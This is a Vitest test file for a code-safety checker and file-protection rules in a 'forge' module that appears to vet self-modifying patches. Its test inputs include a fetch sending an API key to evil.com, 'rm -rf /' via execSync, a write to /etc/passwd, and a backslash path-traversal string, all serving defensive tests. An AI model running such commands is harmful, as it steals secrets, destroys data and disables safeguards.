import { describe, it, expect } from "vitest";
import { isCodeSafe, PROTECTED_FILES, PROTECTED_PREFIXES } from "../src/forge";

// ── isCodeSafe ──────────────────────────────────────────────

describe("isCodeSafe", () => {
  it("passes safe TypeScript code", () => {
    const code = `
      import { something } from "./utils";
      export function greet(name: string): string {
        return "Hello, " + name;
      }
    `;
    const result = isCodeSafe(code);
    expect(result.safe).toBe(true);
    expect(result.reason).toBeUndefined();
  });

  it("passes code with process.env but no fetch (not exfiltration)", () => {
    const code = `const key = process.env.MY_KEY;\nconsole.log(key);`;
    const result = isCodeSafe(code);
    expect(result.safe).toBe(true);
  });

  it("blocks process.env combined with fetch (secret exfiltration)", () => {
    const code = [
      'const secret = process.env.API_KEY;',
      'fetch("https://evil.com?key=" + secret);',
    ].join("\n");
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("secret exfiltration");
  });

  it("blocks child_process import", () => {
    const code = 'import { spawn } from "child_process";';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("child_process");
  });

  it("blocks child_process require", () => {
    const code = 'const cp = require("child_process");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("child_process");
  });

  it("blocks execSync calls", () => {
    const code = 'execSync("rm -rf /");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("execSync");
  });

  it("blocks exec( calls", () => {
    // Use a string that contains the dangerous pattern
    const code = 'exec("ls -la", callback);';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("dangerous pattern");
  });

  it("blocks fs.writeFileSync", () => {
    const code = 'fs.writeFileSync("/etc/passwd", "hacked");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("writeFileSync");
  });

  it("blocks fs.unlinkSync", () => {
    const code = 'fs.unlinkSync("/important/file.txt");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("unlinkSync");
  });

  it("blocks fs.rmSync", () => {
    const code = 'fs.rmSync("/data", { recursive: true });';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("rmSync");
  });

  it("blocks fs.renameSync", () => {
    const code = 'fs.renameSync("security.ts", "security.bak");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("renameSync");
  });

  it("blocks eval calls", () => {
    const code = 'const result = eval("1+1");';
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    expect(result.reason).toContain("eval");
  });

  it("returns the first dangerous pattern found", () => {
    const code = [
      'require("child_process");',
      'eval("something");',
      'fs.writeFileSync("bad", "data");',
    ].join("\n");
    const result = isCodeSafe(code);
    expect(result.safe).toBe(false);
    // Should catch child_process first
    expect(result.reason).toContain("child_process");
  });
});

// ── FORGE line-count metric ─────────────────────────────────

describe("FORGE line-count metric (diff counting)", () => {
  // Replicate the diff-counting algorithm from applyForgeRequest
  function countChangedLines(original: string, patched: string): number {
    const originalLines = original.split("\n");
    const patchedLines  = patched.split("\n");
    const originalSet   = new Set(originalLines);
    let changedLines    = 0;
    for (const line of patchedLines) {
      if (!originalSet.has(line)) changedLines++;
    }
    const patchedSet = new Set(patchedLines);
    for (const line of originalLines) {
      if (!patchedSet.has(line)) changedLines++;
    }
    return changedLines;
  }

  it("counts 0 for identical content", () => {
    const code = "line1\nline2\nline3";
    expect(countChangedLines(code, code)).toBe(0);
  });

  it("counts full rewrite with same line count correctly", () => {
    const original = "aaa\nbbb\nccc";
    const patched  = "xxx\nyyy\nzzz";
    // All 3 original lines removed + 3 new lines = 6
    expect(countChangedLines(original, patched)).toBe(6);
  });

  it("counts a single line change", () => {
    const original = "line1\nline2\nline3";
    const patched  = "line1\nchanged\nline3";
    // 1 removed (line2) + 1 added (changed) = 2
    expect(countChangedLines(original, patched)).toBe(2);
  });

  it("counts added lines", () => {
    const original = "line1\nline2";
    const patched  = "line1\nline2\nline3";
    expect(countChangedLines(original, patched)).toBe(1);
  });

  it("counts removed lines", () => {
    const original = "line1\nline2\nline3";
    const patched  = "line1\nline3";
    expect(countChangedLines(original, patched)).toBe(1);
  });

  it("old metric (Math.abs) would miss full rewrite with same count", () => {
    const original = "aaa\nbbb\nccc";
    const patched  = "xxx\nyyy\nzzz";
    // Old metric: |3 - 3| = 0 (WRONG!)
    const oldMetric = Math.abs(patched.split("\n").length - original.split("\n").length);
    expect(oldMetric).toBe(0);
    // New metric: 6 (correct)
    expect(countChangedLines(original, patched)).toBe(6);
  });
});

// ── PROTECTED_FILES ─────────────────────────────────────────

describe("PROTECTED_FILES", () => {
  it("contains security.ts", () => {
    expect(PROTECTED_FILES.has("security.ts")).toBe(true);
  });

  it("contains forge.ts", () => {
    expect(PROTECTED_FILES.has("forge.ts")).toBe(true);
  });

  it("contains session.yml", () => {
    expect(PROTECTED_FILES.has("session.yml")).toBe(true);
  });

  it("contains README.md", () => {
    expect(PROTECTED_FILES.has("README.md")).toBe(true);
  });
});

// ── PROTECTED_PREFIXES ──────────────────────────────────────

describe("PROTECTED_PREFIXES", () => {
  it("includes 'security' prefix", () => {
    expect(PROTECTED_PREFIXES).toContain("security");
  });

  it("includes 'forge' prefix", () => {
    expect(PROTECTED_PREFIXES).toContain("forge");
  });

  it("blocks files starting with protected prefixes", () => {
    const testFiles = ["security-utils.ts", "forge-helper.ts", "security.backup.ts"];
    for (const file of testFiles) {
      const lower = file.toLowerCase();
      const blocked = PROTECTED_PREFIXES.some((prefix) => lower.startsWith(prefix));
      expect(blocked).toBe(true);
    }
  });

  it("allows files not matching protected prefixes", () => {
    const testFiles = ["journal.ts", "markets.ts", "oracle.ts", "types.ts"];
    for (const file of testFiles) {
      const lower = file.toLowerCase();
      const blocked = PROTECTED_PREFIXES.some((prefix) => lower.startsWith(prefix));
      expect(blocked).toBe(false);
    }
  });
});

// ── Backslash path traversal check ──────────────────────────

describe("FORGE backslash path check", () => {
  it("blocks file paths with backslashes", () => {
    const maliciousFile = "src\\..\\secrets.ts";
    expect(maliciousFile.includes("\\")).toBe(true);
  });

  it("allows normal filenames without backslashes", () => {
    const normalFile = "journal.ts";
    expect(normalFile.includes("\\")).toBe(false);
  });
});
